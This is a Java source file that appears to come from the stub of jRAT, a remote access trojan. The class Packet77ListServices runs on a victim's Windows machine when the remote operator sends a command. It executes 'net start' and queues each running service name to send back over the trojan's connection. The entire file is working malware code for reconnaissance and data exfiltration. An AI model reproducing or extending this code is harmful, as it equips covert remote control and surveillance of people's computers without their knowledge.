package pro.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import pro.jrat.common.OperatingSystem;
import pro.jrat.stub.Connection;
import pro.jrat.stub.packets.outgoing.Packet52WindowsService;



public class Packet77ListServices extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec("net start");
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
				
				String line;
				
				while ((line = reader.readLine()) != null) {
					if (line.startsWith(" ")) {
						Connection.addToSendQueue(new Packet52WindowsService(line.trim()));
					}
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.addToSendQueue(new Packet52WindowsService("Error starting \"net start\" process: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
